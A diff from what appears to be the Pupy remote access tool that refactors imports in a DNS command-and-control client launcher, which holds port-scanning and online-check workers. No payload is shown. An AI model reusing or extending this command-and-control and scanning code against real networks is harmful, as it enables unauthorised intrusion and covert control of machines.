@@ -1,8 +1,9 @@
 # -*- coding: utf-8 -*-
 # Copyright (c) 2016, Oleksii Shevchuk (alxchk@gmail.com)
 
-from ..base_launcher import *
-from ..picocmd import *
+from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
+from ..picocmd.client import DnsCommandsClient
+from ..picocmd.picocmd import ConnectablePort, OnlineStatus, PortQuizPort
 
 from ..proxies import get_proxies
 
@@ -10,6 +11,9 @@ from ..socks import GeneralProxyError, ProxyConnectionError, HTTPError
 
 from ..clients import PupyTCPClient, PupySSLClient
 from ..clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
+
+from ..online import PortQuiz, check
+from ..scan import scan
 
 from threading import Thread, Event, Lock
 
@@ -19,8 +23,10 @@ import os
 import logging
 import subprocess
 
-from network.lib import online
-from network.lib import scan
+import tempfile
+import platform
+
+import network
 
 class DNSCommandClientLauncher(DnsCommandsClient):
     def __init__(self, domain):
@@ -96,7 +102,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 
     def _checkconnect_worker(self, host, port_start, port_end):
         ports = xrange(port_start, port_end+1)
-        connectable = scan.scan([str(host)], ports)
+        connectable = scan([str(host)], ports)
         while connectable:
             chunk = [ x[1] for x in connectable[:5] ]
             connectable = connectable[5:]
@@ -109,10 +115,10 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         worker.start()
 
     def _checkonline_worker(self):
-        portquiz = online.PortQuiz()
+        portquiz = PortQuiz()
         portquiz.start()
 
-        result = online.check()
+        result = check()
         self.event(OnlineStatus(result))
 
         portquiz.join()
